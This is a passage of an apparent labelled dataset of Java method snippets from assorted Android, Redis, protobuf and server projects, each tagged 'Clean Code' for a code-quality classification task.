      int[] colors=((BackgroundGradientDrawable)drawable).getColorsList();
      if (colors != null) {
        if (colors.length > 1) {
          bitmapColor=getAverageColor(colors[0],colors[1]);
        }
 else         if (colors.length > 0) {
          bitmapColor=colors[0];
        }
      }
    }
 else     if (drawable instanceof MotionBackgroundDrawable) {
      result[0]=result[2]=Color.argb(0x2D,0,0,0);
      result[1]=result[3]=Color.argb(0x3D,0,0,0);
      return result;
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  double[] hsv=rgbToHsv((bitmapColor >> 16) & 0xff,(bitmapColor >> 8) & 0xff,bitmapColor & 0xff);
  hsv[1]=Math.min(1.0,hsv[1] + 0.05 + 0.1 * (1.0 - hsv[1]));
  double v=Math.max(0,hsv[2] * 0.65);
  int[] rgb=hsvToRgb(hsv[0],hsv[1],v);
  result[0]=Color.argb(0x66,rgb[0],rgb[1],rgb[2]);
  result[1]=Color.argb(0x88,rgb[0],rgb[1],rgb[2]);
  double v2=Math.max(0,hsv[2] * 0.72);
  rgb=hsvToRgb(hsv[0],hsv[1],v2);
  result[2]=Color.argb(0x66,rgb[0],rgb[1],rgb[2]);
  result[3]=Color.argb(0x88,rgb[0],rgb[1],rgb[2]);
  return result;
}",0,Clean Code
"@Override public List<StreamEntry> xclaim(String key,String group,String consumername,long minIdleTime,long newIdleTime,int retries,boolean force,StreamEntryID... ids){
  return executeInJedis(jedis -> jedis.xclaim(key,group,consumername,minIdleTime,newIdleTime,retries,force,ids));
}
",0,Clean Code
"private void createContactButtons(){
  if (Build.VERSION.SDK_INT >= 21) {
    createSelectorDrawable(0);
  }
  if (drawContact) {
    int needDrawFlag=0;
    int buttonsCount=0;
    if (drawContactView) {
      needDrawFlag|=1;
      buttonsCount++;
    }
    if (drawContactSendMessage) {
      needDrawFlag|=2;
      buttonsCount++;
    }
    if (drawContactAdd) {
      needDrawFlag|=4;
      buttonsCount++;
    }
    if (buttonsCount == 0) {
      contactButtons=null;
      drawnContactButtonsFlag=0;
      return;
    }
    totalHeight+=AndroidUtilities.dp(60);
    boolean needRecreate=needDrawFlag != drawnContactButtonsFlag;
    if (needRecreate) {
      drawnContactButtonsFlag=0;
      int mWidth=(backgroundWidth - AndroidUtilities.dp(10 + 24 + 10+ 31)) / buttonsCount;
      float parentWidth=(backgroundWidth - AndroidUtilities.dpf2(37)) / buttonsCount;
      if (contactButtons == null) {
        contactButtons=new ArrayList<>(buttonsCount);
      }
 else {
        contactButtons.clear();
      }
      if (drawContactView) {
        drawnContactButtonsFlag|=1;
        String str=LocaleController.getString(""ViewContact"",R.string.ViewContact);
        InstantViewButton instantViewButton=createInstantViewButton(INSTANT_BUTTON_TYPE_CONTACT_VIEW,str,mWidth,parentWidth);
        contactButtons.add(instantViewButton);
      }
      if (drawContactSendMessage) {
        drawnContactButtonsFlag|=2;
        String str=LocaleController.getString(""SharedContactMessage"",R.string.SharedContactMessage);
        InstantViewButton instantViewButton=createInstantViewButton(INSTANT_BUTTON_TYPE_CONTACT_SEND_MESSAGE,str,mWidth,parentWidth);
        contactButtons.add(instantViewButton);
      }
      if (drawContactAdd) {
        drawnContactButtonsFlag|=4;
        String str=LocaleController.getString(""SharedContactAdd"",R.string.SharedContactAdd);
        InstantViewButton instantViewButton=createInstantViewButton(INSTANT_BUTTON_TYPE_CONTACT_ADD,str,mWidth,parentWidth);
        contactButtons.add(instantViewButton);
      }
    }
  }
}",0,Clean Code
"@Override public boolean onOptionsItemSelected(@NonNull MenuItem item){
  int id=item.getItemId();
  if (id == R.id.action_undo) {
    if (mEditor != null && mEditor.canUndo()) {
      mEditor.undo();
      return true;
    }
  }
 else   if (id == R.id.action_redo) {
    if (mEditor != null && mEditor.canRedo()) {
      mEditor.redo();
      return true;
    }
  }
 else   if (id == R.id.action_wrap) {
    if (mEditor != null) {
      mEditor.setWordwrap(!mEditor.isWordwrap());
      return true;
    }
  }
 else   if (id == R.id.action_save) {
    saveFile();
    return true;
  }
 else   if (id == R.id.action_save_as) {
    launchIntentSaver();
    return true;
  }
 else   if (id == R.id.action_share) {
    Path filePath=mViewModel.getSourceFile();
    if (filePath != null) {
      Intent intent=new Intent(Intent.ACTION_SEND).setType(filePath.getType()).putExtra(Intent.EXTRA_STREAM,FmProvider.getContentUri(filePath)).addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
      startActivity(Intent.createChooser(intent,getString(R.string.share)));
    }
    return true;
  }
 else   if (id == R.id.action_java_smali_toggle) {
    mViewModel.generateJava(mEditor.getText());
  }
 else   if (id == R.id.action_search) {
    if (mSearchWidget != null) {
      if (mSearchWidget.getVisibility() == View.VISIBLE) {
        hideSearchWidget();
      }
 else       showSearchWidget();
    }
  }
  return false;
}
",0,Clean Code
"private static String readTextFile(List<String> filePaths){
  if (filePaths == null || filePaths.isEmpty()) {
    return null;
  }
  Log.v(TAG,""all file path : "" + filePaths.toString());
  StringBuilder content=new StringBuilder();
  for (  String filePath : filePaths) {
    if (!TextUtils.isEmpty(filePath)) {
      content=new StringBuilder();
      File file=new File(filePath);
      if (file.isFile()) {
        Log.v(TAG,""available filePath: "" + filePath);
        if (file.isFile()) {
          InputStream inputStream=null;
          InputStreamReader streamReader=null;
          BufferedReader buffreader=null;
          try {
            inputStream=new FileInputStream(file);
            streamReader=new InputStreamReader(inputStream);
            buffreader=new BufferedReader(streamReader);
            String line;
            while ((line=buffreader.readLine()) != null) {
              content.append(line);
              content.append(""\n"");
            }
            if (!TextUtils.isEmpty(content)) {
              break;
            }
          }
 catch (          java.io.FileNotFoundException e) {
            Log.d(TAG,""The File doesn't not exist."");
          }
catch (          IOException e) {
            Log.d(TAG,e.getMessage());
          }
 finally {
            try {
              if (inputStream != null) {
                inputStream.close();
              }
              if (streamReader != null) {
                streamReader.close();
              }
              if (buffreader != null) {
                buffreader.close();
              }
            }
 catch (            IOException ignore) {
            }
          }
        }
      }
    }
  }
  return content.toString();
}
",0,Clean Code
"public KeyUsecaseEntry parse(AnnotationExpr keyUsecase){
  KeyUsecaseEntry entry=new KeyUsecaseEntry(className,methodName);
  entry.setJavadoc(JavaParserUtil.javadocFirstLineOf(methodDeclaration));
  if (keyUsecase instanceof MarkerAnnotationExpr) {
    return entry;
  }
  NormalAnnotationExpr normalAnnotationExpr=(NormalAnnotationExpr)keyUsecase;
  for (  MemberValuePair memberValuePair : normalAnnotationExpr.getPairs()) {
switch (memberValuePair.getNameAsString()) {
case ""name"":
      this.methodName=AnnotationFieldParser.singleFieldValue(memberValuePair);
    entry.setMethodName(this.methodName);
  break;
case ""remark"":
entry.setRemark(AnnotationFieldParser.singleFieldValue(memberValuePair));
break;
case ""consumesKeyEvent"":
entry.setKeyEvent(AnnotationFieldParser.singleFieldValue(memberValuePair));
break;
case ""in"":
entry.setIn(new ArrayList<>(AnnotationFieldParser.arrayFieldValue(memberValuePair)));
break;
case ""out"":
entry.setOut(new ArrayList<>(AnnotationFieldParser.arrayFieldValue(memberValuePair)));
break;
}
}
return entry;
}
",0,Clean Code
"/** 
 * @param value The numeric wire value of the corresponding enum entry.
 * @param other Fallback value in case the value is not known.
 * @return The enum associated with the given numeric wire value, or the fallback value if unknown.
 */
public static DisplayRecordType forNumberOr(int number,DisplayRecordType other){
  DisplayRecordType value=forNumber(number);
  return value == null ? other : value;
}
",0,Clean Code
"/** 
 * <code>optional .SceneBattleInfo battle_info = 14;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public SceneBattleInfoOuterClass.SceneBattleInfo getMutableBattleInfo(){
  bitField0_|=0x00000010;
  return battleInfo;
}",0,Clean Code
"public long getLength(){
  return (Math.abs((end - start) / step)) + 1;
}",0,Clean Code
"public int getSource(){
  return this.source;
}
",0,Clean Code
"@Benchmark public Object fury_deserialize_compatible(FuryState.FuryCompatibleState state){
  state.buffer.readerIndex(0);
  Object o=state.fury.readRef(state.buffer);
  state.fury.resetRead();
  return o;
}",0,Clean Code
"private TableIndexColumn getTableIndexColumn(ResultSet resultSet) throws SQLException {
  TableIndexColumn tableIndexColumn=new TableIndexColumn();
  tableIndexColumn.setColumnName(resultSet.getString(""COLUMN_NAME""));
  tableIndexColumn.setOrdinalPosition(resultSet.getShort(""COLUMN_POSITION""));
  String collation=resultSet.getString(""DESCEND"");
  if (""ASC"".equalsIgnoreCase(collation)) {
    tableIndexColumn.setAscOrDesc(""ASC"");
  }
 else   if (""DESC"".equalsIgnoreCase(collation)) {
    tableIndexColumn.setAscOrDesc(""DESC"");
  }
  return tableIndexColumn;
}
",0,Clean Code
"void onResult(int i2,String str,MoveGroupFileResult moveGroupFileResult);",0,Clean Code
"@Override public RogueAction clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  bonusSelectInfo.clearQuick();
  miracleSelectInfo.clearQuick();
  buffSelectInfo.clearQuick();
  return this;
}",0,Clean Code
"@Override public ChessRogueMiracleInfo copyFrom(final ChessRogueMiracleInfo other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    miracleData.copyFrom(other.miracleData);
  }
  return this;
}",0,Clean Code
"public static String queryProjectList(int index){
  return RpcUtil.request(""alipay.antsports.walk.charity.queryProjectList"",""[{\""chInfo\"":\"""" + chInfo + ""\"",\""clientOS\"":\""android\"",\""features\"":[\""DAILY_STEPS_RANK_V2\"",\""STEP_BATTLE\"",\""CLUB_HOME_CARD\"",\""NEW_HOME_PAGE_STATIC\"",\""CLOUD_SDK_AUTH\"",\""STAY_ON_COMPLETE\"",\""EXTRA_TREASURE_BOX\"",\""NEW_HOME_PAGE_STATIC\"",\""SUPPORT_TAB3\"",\""SUPPORT_FLYRABBIT\"",\""PROP\"",\""PROPV2\"",\""ASIAN_GAMES\""],\""index\"":""+ index+ "",\""projectListUseVertical\"":true}]"");
}",0,Clean Code
"@Override public void publish(String subject,byte[] data) throws Exception {
  ensureConnected();
  conn.publish(subject,data);
}
",0,Clean Code
"public Map<String,String> getExternalProperties(){
  return externalProperties;
}
",0,Clean Code
"/** 
 * Joins the elements of the provided  {@code Iterator} intoa single String containing the provided elements.</p> <p/> No delimiter is added before or after the list. A  {@code null} separator is the same as an empty String ("""").</p><p/> Copied from Commons Lang, version 3 (r1138702).</p>
 * @param iterator  the {@code Iterator} of values to join together, may be null
 * @param separator the separator character to use, null treated as """"
 * @return the joined String, {@code null} if null iterator input
 * @since 1.2
 */
public static String join(Iterator<?> iterator,String separator){
  final String empty="""";
  if (iterator == null) {
    return null;
  }
  if (!iterator.hasNext()) {
    return empty;
  }
  Object first=iterator.next();
  if (!iterator.hasNext()) {
    return first == null ? empty : first.toString();
  }
  StringBuilder buf=new StringBuilder(256);
  if (first != null) {
    buf.append(first);
  }
  while (iterator.hasNext()) {
    if (separator != null) {
      buf.append(separator);
    }
    Object obj=iterator.next();
    if (obj != null) {
      buf.append(obj);
    }
  }
  return buf.toString();
}",0,Clean Code
"@Override public Long zlexcount(String key,String min,String max){
  return jedisCluster.zlexcount(key,min,max);
}
",0,Clean Code
"/** 
 * <code>optional uint32 exp = 1;</code>
 * @return this
 */
public RogueHandbookAeon clearExp(){
  bitField0_&=~0x00000001;
  exp=0;
  return this;
}",0,Clean Code
"@Override public void handleTransportError(@NotNull WebSocketSession session,@NotNull Throwable e) throws Exception {
  log.error(""[wss-{}] Transport error"",this.account.getDisplay(),e);
  onFailure(CLOSE_CODE_EXCEPTION,""transport error"");
}
",0,Clean Code
"public static String generateRegular(String raw,int start,int end){
  int newStart=start;
  int newEnd=end;
  String startStr="""";
  String endStr="""";
  String target=raw.substring(start,end);
  String strReg="""";
  if (start > 3) {
    newStart-=3;
  }
 else   if (start > 1) {
    newStart-=1;
  }
  if (end < raw.length() - 3) {
    newEnd+=3;
  }
  for (int i=0; i < raw.length(); i++) {
    startStr=raw.substring(newStart,start);
    startStr=escapeExprSpecialWord(startStr);
    endStr=raw.substring(end,newEnd);
    endStr=escapeExprSpecialWord(endStr);
    strReg=String.format(""%s(.*?)%s"",startStr,endStr);
    System.out.println(""---------------------------------------"");
    System.out.println(strReg);
    BurpExtender.stderr.println(""------------------------------"");
    BurpExtender.stderr.println(""[+] "" + target);
    BurpExtender.stderr.println(strReg);
    if (matchByRegular(raw,strReg).getResult().equals(target)) {
      break;
    }
    if (newStart == 0 && newEnd == raw.length()) {
      break;
    }
    if (newStart > 0) {
      newStart-=1;
    }
    if (newEnd < raw.length()) {
      newEnd+=1;
    }
  }
  return strReg;
}",0,Clean Code
"private static boolean hasToken(OAuth2Authorization authorization,String token,@Nullable OAuth2TokenType tokenType){
  if (tokenType == null) {
    return matchesState(authorization,token) || matchesAuthorizationCode(authorization,token) || matchesAccessToken(authorization,token)|| matchesIdToken(authorization,token)|| matchesRefreshToken(authorization,token)|| matchesDeviceCode(authorization,token)|| matchesUserCode(authorization,token);
  }
 else   if (OAuth2ParameterNames.STATE.equals(tokenType.getValue())) {
    return matchesState(authorization,token);
  }
 else   if (OAuth2ParameterNames.CODE.equals(tokenType.getValue())) {
    return matchesAuthorizationCode(authorization,token);
  }
 else   if (OAuth2TokenType.ACCESS_TOKEN.equals(tokenType)) {
    return matchesAccessToken(authorization,token);
  }
 else   if (OidcParameterNames.ID_TOKEN.equals(tokenType.getValue())) {
    return matchesIdToken(authorization,token);
  }
 else   if (OAuth2TokenType.REFRESH_TOKEN.equals(tokenType)) {
    return matchesRefreshToken(authorization,token);
  }
 else   if (OAuth2ParameterNames.DEVICE_CODE.equals(tokenType.getValue())) {
    return matchesDeviceCode(authorization,token);
  }
 else   if (OAuth2ParameterNames.USER_CODE.equals(tokenType.getValue())) {
    return matchesUserCode(authorization,token);
  }
  return false;
}",0,Clean Code
"/** 
 * <code>optional bool b2 = 8;</code>
 * @param value the b2 to set
 * @return this
 */
public PlayerSettingInfo setB2(final boolean value){
  bitField0_|=0x00000020;
  b2=value;
  return this;
}",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)96);
    output.writeUInt32NoTag(talentId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)120);
    output.writeEnumNoTag(status);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    for (int i=0; i < unlockProgressList.length(); i++) {
      output.writeRawByte((byte)106);
      output.writeMessageNoTag(unlockProgressList.get(i));
    }
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.talentId,talentId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeEnum(FieldNames.status,status,RogueTalentStatusOuterClass.RogueTalentStatus.converter());
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRepeatedMessage(FieldNames.unlockProgressList,unlockProgressList);
  }
  output.endObject();
}",0,Clean Code
"public void prepare(){
  ArrayList<SamplePresentationTime> original=new ArrayList<>(samplePresentationTimes);
  Collections.sort(samplePresentationTimes,(o1,o2) -> {
    if (o1.presentationTime > o2.presentationTime) {
      return 1;
    }
 else     if (o1.presentationTime < o2.presentationTime) {
      return -1;
    }
    return 0;
  }
);
  long lastPresentationTimeUs=0;
  sampleDurations=new long[samplePresentationTimes.size()];
  long minDelta=Long.MAX_VALUE;
  boolean outOfOrder=false;
  for (int a=0; a < samplePresentationTimes.size(); a++) {
    SamplePresentationTime presentationTime=samplePresentationTimes.get(a);
    long delta=presentationTime.presentationTime - lastPresentationTimeUs;
    lastPresentationTimeUs=presentationTime.presentationTime;
    sampleDurations[presentationTime.index]=delta;
    if (presentationTime.index != 0) {
      duration+=delta;
    }
    if (delta > 0 && delta < Integer.MAX_VALUE) {
      minDelta=Math.min(minDelta,delta);
    }
    if (presentationTime.index != a) {
      outOfOrder=true;
    }
  }
  if (sampleDurations.length > 0) {
    sampleDurations[0]=minDelta;
    duration+=minDelta;
  }
  for (int a=1; a < original.size(); a++) {
    original.get(a).dt=sampleDurations[a] + original.get(a - 1).dt;
  }
  if (outOfOrder) {
    sampleCompositions=new int[samplePresentationTimes.size()];
    for (int a=0; a < samplePresentationTimes.size(); a++) {
      SamplePresentationTime presentationTime=samplePresentationTimes.get(a);
      sampleCompositions[presentationTime.index]=(int)(presentationTime.presentationTime - presentationTime.dt);
    }
  }
}",0,Clean Code
"public int getForceExit(){
  return this.forceExit;
}
",0,Clean Code
"String getGifUrl();
",0,Clean Code
"@Override public Result<List<Map<String,Object>>> queryFieldInfo(Integer label,Long typeId){
  return null;
}
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)16);
    output.writeUInt32NoTag(retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)50);
    output.writeMessageNoTag(battleInfo);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.retcode,retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeMessage(FieldNames.battleInfo,battleInfo);
  }
  output.endObject();
}",0,Clean Code
"@AfterAll public static void afterAll(){
  evaluator.close();
}
",0,Clean Code
"private long continueReadVarInt36(int readIdx,long bulkValue,long result){
  readIdx++;
  result|=(bulkValue >>> 2) & 0x1fc000;
  if ((bulkValue & 0x800000) != 0) {
    readIdx++;
    result|=(bulkValue >>> 3) & 0xfe00000;
    if ((bulkValue & 0x80000000L) != 0) {
      readIdx++;
      result|=(bulkValue >>> 4) & 0xff0000000L;
    }
  }
  readerIndex=readIdx;
  return result;
}",0,Clean Code
"public void setAppId(int i2){
  this.appId=i2;
}",0,Clean Code
"public static CharSequence getTopicSpannedName(TLRPC.ForumTopic topic,Paint paint,boolean isDialog){
  return getTopicSpannedName(topic,paint,null,isDialog);
}
public static CharSequence getTopicSpannedName(TLRPC.ForumTopic topic,Paint paint,Drawable[] drawableToSet,boolean isDialog){
  SpannableStringBuilder sb=new SpannableStringBuilder();
  if (topic instanceof TLRPC.TL_forumTopic) {
    TLRPC.TL_forumTopic forumTopic=(TLRPC.TL_forumTopic)topic;
    if (forumTopic.id == 1) {
      try {
        Drawable drawable=createGeneralTopicDrawable(ApplicationLoader.applicationContext,1f,paint == null ? Theme.getColor(Theme.key_chat_inMenu) : paint.getColor(),isDialog);
        drawable.setBounds(0,0,paint == null ? AndroidUtilities.dp(14) : (int)(paint.getTextSize()),paint == null ? AndroidUtilities.dp(14) : (int)(paint.getTextSize()));
        sb.append("" "");
        if (drawableToSet != null) {
          drawableToSet[0]=drawable;
        }
        sb.setSpan(new ImageSpan(drawable,DynamicDrawableSpan.ALIGN_CENTER),0,1,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
      }
 catch (      Exception e) {
      }
    }
 else     if (forumTopic.icon_emoji_id != 0) {
      sb.append("" "");
      AnimatedEmojiSpan span;
      sb.setSpan(span=new AnimatedEmojiSpan(forumTopic.icon_emoji_id,.95f,paint == null ? null : paint.getFontMetricsInt()),0,1,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
      span.top=true;
      span.cacheType=AnimatedEmojiDrawable.CACHE_TYPE_ALERT_PREVIEW_STATIC;
    }
 else {
      sb.append("" "");
      Drawable drawable=ForumUtilities.createTopicDrawable(forumTopic,isDialog);
      if (drawableToSet != null) {
        drawableToSet[0]=((CombinedDrawable)drawable).getBackgroundDrawable();
      }
      drawable.setBounds(0,0,(int)(drawable.getIntrinsicWidth() * 0.65f),(int)(drawable.getIntrinsicHeight() * 0.65f));
      if (drawable instanceof CombinedDrawable && ((CombinedDrawable)drawable).getIcon() instanceof LetterDrawable) {
        ((LetterDrawable)((CombinedDrawable)drawable).getIcon()).scale=.7f;
      }
      if (paint != null) {
        ColoredImageSpan imageSpan=new ColoredImageSpan(drawable);
        imageSpan.setSize((int)(Math.abs(paint.getFontMetrics().descent) + Math.abs(paint.getFontMetrics().ascent)));
        sb.setSpan(imageSpan,0,1,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
      }
 else {
        sb.setSpan(new ImageSpan(drawable),0,1,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
      }
    }
    if (!TextUtils.isEmpty(forumTopic.title)) {
      sb.append("" "");
      sb.append(forumTopic.title);
    }
  }
 else {
    return ""DELETED"";
  }
  return sb;
}",0,Clean Code
"@Override public int getId(){
  return (ID << 8) + WorldLevel;
}",0,Clean Code
"protected ListingOrMappingTypeNode(SourceSection sourceSection,@Nullable TypeNode keyTypeNode,TypeNode valueTypeNode){
  super(sourceSection);
  this.keyTypeNode=keyTypeNode;
  this.valueTypeNode=valueTypeNode;
  skipKeyTypeChecks=keyTypeNode == null || keyTypeNode.isNoopTypeCheck();
  skipValueTypeChecks=valueTypeNode.isNoopTypeCheck();
}
",0,Clean Code
"public static void isNull(Object object,String message){
  if (object != null) {
    throw new IllegalArgumentException(message);
  }
}
public static void isNull(Object object){
  isNull(object,""[Assertion failed] - the object argument must be null"");
}
",0,Clean Code
"@Override public CfAdLinksExample getExampleByQuery(CfAdLinksQuery cfAdLinksQuery){
  CfAdLinksExample cfAdLinksExample=new CfAdLinksExample();
  CfAdLinksExample.Criteria criteria=cfAdLinksExample.createCriteria();
  if (cfAdLinksQuery.getId() != null) {
    criteria.andIdEqualTo(cfAdLinksQuery.getId());
  }
  if (cfAdLinksQuery.getAdId() != null) {
    criteria.andAdIdEqualTo(cfAdLinksQuery.getAdId());
  }
  if (cfAdLinksQuery.getScenes() != null) {
    criteria.andScenesEqualTo(cfAdLinksQuery.getScenes());
  }
  if (cfAdLinksQuery.getPlatform() != null) {
    criteria.andPlatformEqualTo(cfAdLinksQuery.getPlatform());
  }
  if (cfAdLinksQuery.getCarrierId() != null) {
    criteria.andCarrierIdEqualTo(cfAdLinksQuery.getCarrierId());
  }
  if (cfAdLinksQuery.getCarrierIds() != null) {
    criteria.andCarrierIdIn(cfAdLinksQuery.getCarrierIds());
  }
  if (cfAdLinksQuery.getMinStartTime() != null) {
    criteria.andStartTimeGreaterThanOrEqualTo(cfAdLinksQuery.getMinStartTime());
  }
  if (cfAdLinksQuery.getMaxStartTime() != null) {
    criteria.andStartTimeLessThanOrEqualTo(cfAdLinksQuery.getMaxStartTime());
  }
  if (cfAdLinksQuery.getMinEndTime() != null) {
    criteria.andEndTimeGreaterThanOrEqualTo(cfAdLinksQuery.getMinEndTime());
  }
  if (cfAdLinksQuery.getMaxEndTime() != null) {
    criteria.andEndTimeLessThanOrEqualTo(cfAdLinksQuery.getMaxEndTime());
  }
  if (StringUtils.isNotEmpty(cfAdLinksQuery.getOrderBy())) {
    cfAdLinksExample.setOrderByClause(cfAdLinksQuery.getOrderBy());
  }
  if (cfAdLinksQuery.getPage() != null && cfAdLinksQuery.getSize() != null) {
    PageHelper.startPage(cfAdLinksQuery.getPage(),cfAdLinksQuery.getSize());
  }
  return cfAdLinksExample;
}
",0,Clean Code
"@PostMapping(value=""/sweep/requeue/{workflowId}"",produces=TEXT_PLAIN_VALUE) @Operation(summary=""Queue up all the running workflows for sweep"") public String requeueSweep(@PathVariable(""workflowId"") String workflowId){
  return adminService.requeueSweep(workflowId);
}
",0,Clean Code
"/** 
 * Storage init properties
 */
private void initProp(){
  Properties props=getProperties();
  String connectTimeoutInSecondsConf=props.getProperty(PROP_KEY_CONNECT_TIMEOUT_IN_SECONDS);
  String networkTimeoutInSecondsConf=props.getProperty(PROP_KEY_NETWORK_TIMEOUT_IN_SECONDS);
  String charsetConf=props.getProperty(PROP_KEY_CHARSET);
  String httpAntiStealTokenConf=props.getProperty(PROP_KEY_HTTP_ANTI_STEAL_TOKEN);
  String httpSecretKeyConf=props.getProperty(PROP_KEY_HTTP_SECRET_KEY);
  String httpTrackerHttpPortConf=props.getProperty(PROP_KEY_HTTP_TRACKER_HTTP_PORT);
  String poolEnabled=props.getProperty(PROP_KEY_CONNECTION_POOL_ENABLED);
  String poolMaxCountPerEntry=props.getProperty(PROP_KEY_CONNECTION_POOL_MAX_COUNT_PER_ENTRY);
  String poolMaxIdleTime=props.getProperty(PROP_KEY_CONNECTION_POOL_MAX_IDLE_TIME);
  String poolMaxWaitTimeInMS=props.getProperty(PROP_KEY_CONNECTION_POOL_MAX_WAIT_TIME_IN_MS);
  if (connectTimeoutInSecondsConf != null && !connectTimeoutInSecondsConf.trim().isEmpty()) {
    ClientGlobal.g_connect_timeout=Integer.parseInt(connectTimeoutInSecondsConf.trim()) * 1000;
  }
  if (networkTimeoutInSecondsConf != null && !networkTimeoutInSecondsConf.trim().isEmpty()) {
    ClientGlobal.g_network_timeout=Integer.parseInt(networkTimeoutInSecondsConf.trim()) * 1000;
  }
  if (charsetConf != null && !charsetConf.trim().isEmpty()) {
    ClientGlobal.g_charset=charsetConf.trim();
  }
  if (httpAntiStealTokenConf != null && !httpAntiStealTokenConf.trim().isEmpty()) {
    ClientGlobal.g_anti_steal_token=Boolean.parseBoolean(httpAntiStealTokenConf);
  }
  if (httpSecretKeyConf != null && !httpSecretKeyConf.trim().isEmpty()) {
    ClientGlobal.g_secret_key=httpSecretKeyConf.trim();
  }
  if (httpTrackerHttpPortConf != null && !httpTrackerHttpPortConf.trim().isEmpty()) {
    ClientGlobal.g_tracker_http_port=Integer.parseInt(httpTrackerHttpPortConf);
  }
  if (poolEnabled != null && !poolEnabled.trim().isEmpty()) {
    ClientGlobal.g_connection_pool_enabled=Boolean.parseBoolean(poolEnabled);
  }
  if (poolMaxCountPerEntry != null && !poolMaxCountPerEntry.trim().isEmpty()) {
    ClientGlobal.g_connection_pool_max_count_per_entry=Integer.parseInt(poolMaxCountPerEntry);
  }
  if (poolMaxIdleTime != null && !poolMaxIdleTime.trim().isEmpty()) {
    ClientGlobal.g_connection_pool_max_idle_time=Integer.parseInt(poolMaxIdleTime) * 1000;
  }
  if (poolMaxWaitTimeInMS != null && !poolMaxWaitTimeInMS.trim().isEmpty()) {
    ClientGlobal.g_connection_pool_max_wait_time_in_ms=Integer.parseInt(poolMaxWaitTimeInMS);
  }
}",0,Clean Code
"@Override public String toString(){
  return ""MyBean{"" + ""age="" + age + '}';
}
",0,Clean Code
"/** 
 * <code>optional .ItemCostList roll_buffs_cost = 14;</code>
 * @return this
 */
public RogueCommonBuffSelectInfo clearRollBuffsCost(){
  bitField0_&=~0x00000100;
  rollBuffsCost.clear();
  return this;
}",0,Clean Code
"public final Object convert(ResultSetMetaData metaData,ResultSet rs,int columnIndex,String encoding) throws Exception {
  int columnType=metaData.getColumnType(columnIndex);
  String columnName=metaData.getColumnName(columnIndex);
  String columnTypeName=metaData.getColumnTypeName(columnIndex);
  Object value=extract(rs,metaData,columnIndex,columnType,columnTypeName,columnName,encoding);
  LOG.debug(""value: {}"",value);
  return convert(value,columnType,columnName,columnTypeName);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@6befca7c",0,Clean Code
"private void readCommand(Command command) throws IOException {
  if (command != null) {
    while (!mClosed) {
      String line=mIn.readLine();
      if (line == null || mClosed) {
        break;
      }
      int pos=line.indexOf(TOKEN);
      if (pos > 0) {
        command.onUpdate(command.getID(),line.substring(0,pos));
      }
      if (pos >= 0) {
        line=line.substring(pos);
        String[] fields=line.split("" "");
        if (fields.length >= 2 && fields[1] != null) {
          int id=0;
          try {
            id=Integer.parseInt(fields[1]);
          }
 catch (          NumberFormatException ignored) {
          }
          int exitCode=-1;
          try {
            exitCode=Integer.parseInt(fields[2]);
          }
 catch (          NumberFormatException ignored) {
          }
          if (id == command.getID()) {
            command.setExitCode(exitCode);
            break;
          }
        }
      }
      command.onUpdate(command.getID(),line);
    }
  }
}",0,Clean Code
"public static Lookup _trustedLookup(Class<?> objectClass){
  if (GraalvmSupport.isGraalBuildtime()) {
    return _Lookup._trustedLookup(objectClass);
  }
  return lookupCache.get(objectClass);
}
",0,Clean Code
"public String toString(){
  return ""CommentForRead{id="" + this.id + "",postUser=""+ this.postUser+ "",createTime=""+ this.createTime+ "",content=""+ this.content+ "",replyCount=""+ this.replyCount+ "",vecReply=""+ this.vecReply+ "",likeInfo=""+ this.likeInfo+ "",richContents=""+ this.richContents+ "",sequence=""+ this.sequence+ "",}"";
}
",0,Clean Code
"@Override public AvatarExpUpScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  retcode=0;
  returnItemList.clear();
  return this;
}",0,Clean Code
"@Override public void write(MemoryBuffer buffer,ZoneId obj){
  fury.writeString(buffer,obj.getId());
}
",0,Clean Code
"@Override public EnhanceRogueBuffCsReq mergeFrom(final EnhanceRogueBuffCsReq other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasBuffId()) {
    setBuffId(other.buffId);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@71617386!org.eclipse.jdt.core.dom.MethodDeclaration@5c6041",0,Clean Code
"public MistralAiChatModelBuilder responseFormat(String responseFormat){
  this.responseFormat=responseFormat;
  return this;
}
public MistralAiChatModelBuilder responseFormat(MistralAiResponseFormatType responseFormat){
  this.responseFormat=responseFormat.toString();
  return this;
}
",0,Clean Code
String getA2(String uin);,0,Clean Code
"@Override public void run(SourceContext<T> ctx) throws Exception {
  Instant lastConsumeInstant=Instant.now();
  while (running) {
    ConsumerResult consumeResult=messagePullConsumer.getMessage();
    if (!consumeResult.isSuccess()) {
